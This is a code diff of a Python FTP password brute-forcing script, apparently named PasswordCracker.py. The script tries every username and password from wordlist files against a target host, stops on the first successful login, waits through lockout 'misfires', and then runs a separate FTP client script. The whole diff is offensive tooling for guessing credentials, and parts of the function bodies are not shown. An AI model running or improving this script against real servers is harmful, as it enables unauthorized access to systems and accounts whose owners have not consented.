@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 import ftplib, linecache, sys, time
 from datetime import datetime
 
@@ -11,7 +11,9 @@ def logfile(target,users,passw):
         pfile=open(passw,'r')
         for user in ufile.readlines():
             for password in pfile.readlines():
-                bruteftp(target,user,password)
+                if (bruteftp(target,user,password) is True):
+                    break
+        exec(open("./ftpClient.py").read())
     except Exception as e:
         print(e)
 
@@ -35,8 +37,8 @@ def bruteftp(target,users,passw):
         # Generate Report
         print ("Scanning Completed in: ", total, "\n")
         
-        exec(open("./ftpClient.py").read())
-        quit()
+        return True
+
     except Exception as e:
         print (str(e))
         
@@ -51,17 +53,19 @@ def bruteftp(target,users,passw):
             print("Misfire! Cool down for 60 seconds.")
             time.sleep(60)
         print("Incorrect credentials.")
-        return(None,None)
+        return False
 
         print ('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_o))
 
 host=hostIP
 
-# Print
+#Print
 hostLength = 14-len(str(host))
 print ("*" * 60)
+print ("* PasswordCracker.py", " " * 38 + "*") 
 print ("* Please wait, attempting to crack password:", host + " " * hostLength + "*")
 print ("*" * 60)
+time.sleep(3)
 
 users="user.txt"
 passw="password.txt"
